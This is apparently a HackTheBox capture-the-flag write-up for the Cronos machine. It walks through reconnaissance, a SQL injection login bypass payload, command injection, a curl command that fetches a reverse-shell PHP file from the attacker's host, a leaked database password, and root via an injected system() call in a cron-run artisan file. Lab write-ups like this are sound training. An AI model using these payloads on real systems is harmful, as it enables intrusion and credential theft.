# Writeup
![](assets/pwned.png)

Performing a port scan:
```
nmap -sS -sV -A -p- -o nmap.txt 10.10.10.13
```

```
Port 22 (SSH)
Port 53 (DNS)
Port 80 (HTTP)
```

Retrieving DNS details for potential hosts.
```
nslookup
10.10.10.13
```

Gave me the address:

```
'ns1.cronos.htb'
```

I proceeded to add:

```
cronos.htb
ns1.cronos.htb
```

To my /etc/hosts file.

Performed a subdomain bruteforce against `cronos.htb`

```
ffuf -w /home/veil/Documents/ctf/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.cronos.htb" -u http://cronos.htb --fw 3534
```

It discovered

```
[Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 51ms]
    * FUZZ: admin
```

I proceeded to add `admin.cronos.htb` to my /etc/hosts file.

Proxied sqlmap via burpsuite due to redirect response keep coming up
It turns out it was vulnerable to an SQL Injection Auth Bypass.
```
POST /index.php HTTP/1.1
Content-Length: 60
Host: admin.cronos.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://admin.cronos.htb
Referer: http://admin.cronos.htb/index.php
Cookie: PHPSESSID=t9nj4ca4liad1gr3d1tikn0i63
Upgrade-Insecure-Requests: 1
Connection: close

username=-3341%27%20OR%205447%3D5447--%20lnZF&password=
```

This login request worked.

The inside was vulnerable to command injection with no bypass techniques needed.

```
10.10.14.19 && cat /etc/passwd
```

```
veil@msi:~/Documents/ctf/serious/cronos$ sudo tcpdump -i tun0 icmp 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:51:20.393502 IP cronos.htb > msi: ICMP echo request, id 2245, seq 1, length 64
01:51:20.393517 IP msi > cronos.htb: ICMP echo reply, id 2245, seq 1, length 64
```

Successful command execution on the target.

Uploading reverse shell

```
10.10.14.19 && curl http://10.10.14.19/shell.php --output shell.php
```

Visit http://admin.cronos.htb/shell.php
shell as www-data achieved.

# Shell

config.php located in server root.

```
www-data@cronos:/var/www/admin$ cat config.php
cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

Logging into the DB gave the following hash:

```
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
```

Was unable to crack the hash.
Just a rabbit hole.

Proceeded to check

```
/etc/crontab
```

Discovered:

```
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

artisan is ran is root every one minute, simple privilege escalation. Add the following the the artisan file to retrieve the root flag.

```
system('cat /root/root.txt > /tmp/root.txt');
```

Good machine from HackTheBox! Relatively simple for a medium rated box, I would've given it an 'easy' tag however still a lot of fun.
